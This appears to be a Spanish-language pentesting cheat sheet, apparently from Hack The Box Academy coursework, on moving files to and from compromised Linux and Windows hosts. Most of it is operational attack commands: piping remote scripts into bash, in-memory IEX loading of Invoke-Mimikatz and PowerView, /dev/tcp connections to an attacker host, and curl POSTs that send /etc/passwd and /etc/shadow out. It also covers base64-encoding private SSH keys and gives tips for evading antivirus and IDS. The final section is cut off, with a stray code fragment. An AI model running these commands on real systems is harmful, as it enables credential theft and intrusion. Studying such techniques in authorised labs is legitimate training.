# Linux

## Download

### Herramientas estándar

Métodos simples usando wget o curl:

```bash
# Con wget
wget url -O archivo

# Con curl
curl -o archivo url
```

### Ejecución remota (sin guardar a disco)

Si no podemos escribir en el sistema o queremos ejecutar directamente:

```bash
# Ejecutar script bash directamente
curl url | bash

# Con wget y python
wget -q0- url | python3
```

### Codificación Base64

Para transferencias seguras o evasión de filtros:

```bash
# Codificar a base64
cat id_rsa | base64 -w 0; echo

# Decodificar desde base64
echo -n 'string' | base64 -d 
```

### Mediante TCP puro

Conexión directa usando redirección de descriptores de archivos (útil cuando wget/curl no están disponibles):

```bash
# Abrir conexión TCP
exec 3<>/dev/tcp/attacker_ip/80

# Enviar request HTTP
echo -e "GET /archivo HTTP/1.1\n\n">&3

# Recibir respuesta
cat <&3
```

### Mediante SCP

Transferencia segura si tenemos credenciales SSH:

```bash
# Descargar archivo
scp user@ip:/ruta/archivo .

# Descargar directorio completo
scp -r user@ip:/ruta/directorio .
```

## Upload

### Python Upload Server (Recomendado)

Servidor HTTP con funcionalidad de upload. Es uno de los métodos más seguros y versátiles.

**Instalación y configuración**:

```bash
# Instalar uploadserver
sudo python3 -m pip install --user uploadserver

# Generar certificado SSL (opcional pero recomendado)
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Iniciar servidor en puerto 443 con SSL
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

**Subir archivos desde la máquina comprometida**:

```bash
# Subir uno o varios archivos
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Servidores HTTP alternativos

Si uploadserver no está disponible, existen alternativas:

```bash
# Python 3 - Servidor HTTP simple
python3 -m http.server

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -ehttpd . -p8000
```

Acceder a los archivos desde el atacante con wget o curl.

### SCP (Transferencia segura)

Método directo usando SSH:

```bash
# Subir archivo
scp /ruta/local/archivo user@ip:/ruta/remota/

# Subir directorio
scp -r /ruta/local/directorio user@ip:/ruta/remota/

# Ejemplo: subir /etc/passwd a servidor objetivo
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```


# Windows

## Download

### Base64 (Transferencia encriptada)

Útil para evadir antivirus y firewalls:

**En Linux (codificar)**:
```bash
cat id_rsa | base64 -w 0; echo
```

**En Windows (decodificar)**:
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("STRING"))
```

**Verificar integridad**:
```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

### Certutil

Herramienta nativa de Windows para descargas:

```powershell
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

### PowerShell - WebClient

Métodos nativos de PowerShell para descarga de archivos:

| Método | Descripción |
|--------|-------------|
| `OpenRead` | Devuelve los datos como stream |
| `OpenReadAsync` | Devuelve stream de forma asíncrona |
| `DownloadData` | Devuelve array de bytes |
| `DownloadDataAsync` | Devuelve array de bytes asíncrono |
| `DownloadFile` | Descarga a archivo local |
| `DownloadFileAsync` | Descarga a archivo local asíncrono |
| `DownloadString` | Descarga string |
| `DownloadStringAsync` | Descarga string asíncrono |

**Ejemplos prácticos**:

```powershell
# Descargar archivo a disco
(New-Object Net.WebClient).DownloadFile('URL','C:\ruta\salida')

# Descargar y ejecutar en memoria (una línea)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

# Con pipe (más limpio)
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### PowerShell - Invoke-WebRequest (iwr/curl/wget)

Alternativas modernas a WebClient:

```powershell
# Descarga básica
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

# Descargar y ejecutar
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Referencia completa: https://gist.github.com/HarmJ0y/bb48307ffa663256e239

### Resolución de errores SSL/TLS

Si hay problemas con certificados SSL:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB (Server Message Block)

Transferencia mediante compartir SMB:

**En Linux (servidor SMB)**:
```bash
# Crear servidor SMB con impacket
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -pass test
```

**En Windows (cliente)**:
```powershell
# Descargar archivo directamente
copy \\\ip\share\nc.exe

# O montar la unidad primero
net use n: \\ip\share /user:test test
# Luego acceder a n: como unidad
```

### FTP

Descarga mediante FTP:

**En Linux (servidor FTP)**:
```bash
# Con pyftpdlib (versión moderna)
sudo python3 -m pyftpdlib -p 21 -u test -P test -w
```

**En Windows (cliente)**:
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/nc.exe', 'C:\Users\Public\nc.exe')
```

## Upload

### Base64 (Transferencia encriptada)

Para subir archivos usando Base64:

**En Windows (codificar)**:
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\ruta\archivo" -Encoding byte))
```

**Enviar al servidor atacante**:
```powershell
$b64 = [Convert]::ToBase64String((Get-Content -path "C:\Windows\System32\drivers\etc\hosts" -Encoding byte))
Invoke-WebRequest -Uri http://ip:puerto/ -Method POST -Body $b64
```

**En Linux (listener para recibir)**:
```bash
nc -lvnp 8000
```

### PowerShell Upload Server

Script PowerShell que actúa como cliente de upload:

```powershell
# Descargar e importar el script PSUpload
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

# Subir archivo
Invoke-FileUpload -Uri http://ip:puerto/upload -File C:\Windows\System32\drivers\etc\hosts
```

Referencia: https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1

### WebDAV (wsgidav & cheroot)

Excelente para bypassear restricciones de SMB:

**En Linux (servidor WebDAV)**:
```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

**En Windows (cliente)**:
```powershell
# Ver contenido del servidor
dir \\ip\DavWWWRoot

# Subir archivo
copy C:\source \\ip\DavWWWRoot\carpeta
```

**Nota**: `DavWWWRoot` es una keyword reservada que apunta a la raíz del servidor WebDAV.

### SMB Upload

Transferencia mediante compartir SMB:

**En Linux (servidor SMB)**:
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -pass test
```

**En Windows (cliente)**:
```powershell
# Montar unidad de red
net use n: \\ip\share /user:test test

# Copiar archivos
copy C:\archivo n:\archivo
```

### FTP Upload

Transferencia mediante FTP:

**En Linux (servidor FTP)**:
```bash
sudo python3 -m pyftpdlib --port 21 --write
```

**En Windows (cliente)**:
```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```


# Transferencia mediante código

Métodos de descarga y ejecución usando lenguajes de scripting sin herramientas estándar.

## Download

### Python

Descargas usando Python 2 y Python 3:

**Python 2.7**:
```python
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

**Python 3**:
```python
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### PHP

Métodos simples y avanzados en PHP:

**Método simple**:
```php
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

**Método con buffer (más eficiente)**:
```php
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

**Ejecutar directamente en bash**:
```php
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

### Ruby

Descarga con Ruby:

```ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

### Perl

Descarga con Perl:

```perl
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### JavaScript (JScript)

Script Windows para descarga:

```javascript
// wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

**Ejecutar**:
```powershell
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

### VBScript

Alternativa VBScript para Windows:

```vbscript
' wget.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

**Ejecutar**:
```powershell
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## Upload

### Python - Upload a servidor HTTP

Subida de archivos a servidor HTTP/uploadserver:

```python
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

# Otros métodos

## Netcat / Ncat

Transferencia mediante conexión TCP directa:

### Método 1: Máquina comprometida escucha

**En la máquina comprometida** (abre listener):
```bash
# Opción 1: netcat
nc -l -p 8000 > archivo

# Opción 2: ncat (más moderno)
ncat -l -p 8000 --recv-only > archivo
```

**En el atacante** (envía el archivo):
```bash
# Opción 1: netcat
nc -q 0 192.168.49.128 8000 < archivo

# Opción 2: ncat
ncat --send-only 192.168.49.128 8000 < archivo
```

### Método 2: Atacante escucha (más evasivo)

Estos métodos implican conexión activa desde la máquina víctima, lo que puede ser más evasivo. El atacante escucha en un puerto alto (443 en este caso):

**En el atacante** (listener):
```bash
# Opción 1: netcat
sudo nc -l -p 443 -q 0 < archivo

# Opción 2: ncat
sudo ncat -l -p 443 --send-only < archivo
```

**En la máquina comprometida** (cliente):
```bash
# Opción 1: netcat
nc 192.168.49.128 443 > archivo

# Opción 2: ncat
ncat 192.168.49.128 443 --recv-only > archivo

# Opción 3: Si no tiene ncat/nc, usar /dev/tcp
cat < /dev/tcp/192.168.49.128/443 > archivo
```

## WinRM (Active Directory)

Transferencia de archivos entre máquinas en dominio AD:

```powershell
# Crear sesión remota hacia otra máquina del dominio
$Session = New-PSSession -ComputerName DATABASE01

# Copiar archivo desde máquina remota a local
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session

# Copiar archivo de local a máquina remota
Copy-Item -Path "C:\local\archivo.txt" -Destination "C:\" -ToSession $Session
```

## RDP (Remote Desktop Protocol)

Montar directorios locales en sesiones RDP:

**Con rdesktop**:
```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

**Con xfreerdp** (recomendado, más moderno):
```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

Una vez conectado, el directorio estará disponible en `\\\tsclient\linux\`.

## Referencias de LOLBAS / GTFOBins

Utilidades del sistema para transferencia de archivos:

- **LOLBAS** (Windows): https://lolbas-project.github.io/ - Búsqueda de binarios para download/upload
- **GTFOBins** (Linux): https://gtfobins.github.io/ - Búsqueda de binarios para file download/upload

# Descargar con User Agent personalizado
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

Este método ayuda a evitar la detección por sistemas de IDS/WAF que buscan User Agents por defecto de PowerShell.
